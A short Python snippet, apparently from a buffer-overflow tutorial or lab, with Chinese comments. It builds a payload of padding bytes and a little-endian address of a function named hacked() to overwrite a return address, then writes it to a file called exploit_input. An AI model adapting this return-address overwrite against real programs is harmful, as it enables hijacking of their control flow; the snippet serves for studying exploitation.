payload = b"A" * 16  # 填充 buffer
payload += b"B" * 4   # 覆盖其他内容
payload += b"\x88\x04\x01\x00"  # 小端序的 hacked() 地址

with open("exploit_input", "wb") as f:
    f.write(payload)
